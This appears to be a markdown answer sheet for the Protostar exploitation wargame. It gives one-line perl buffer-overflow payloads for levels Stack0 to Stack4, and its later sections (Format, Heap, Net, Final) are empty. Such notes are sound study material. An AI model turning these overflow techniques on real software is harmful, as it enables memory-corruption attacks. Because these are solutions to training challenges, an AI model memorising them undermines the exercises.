# Protostar
## Stack
### Stack0
```
perl -e 'print "A" x 65' | ./stack0
```

### Stack1
```
./stack1 $(perl -e 'print "A" x 64 . "\x64\x63\x62\x61"')
```

### Stack2
```
GREENIE="$(perl -e 'print "A" x 64 . "\x0a\x0d\x0a\x0d"')" ./stack2
```

### Stack3
```
perl -e 'print "A" x 64 . "\x24\x84\x04\x08"' | ./stack3
```

### Stack4
```
perl -e 'print "A" x 76 . "\xf4\x83\x04\x08"' | ./stack4
```
## Format
## Heap
## Net
## Final
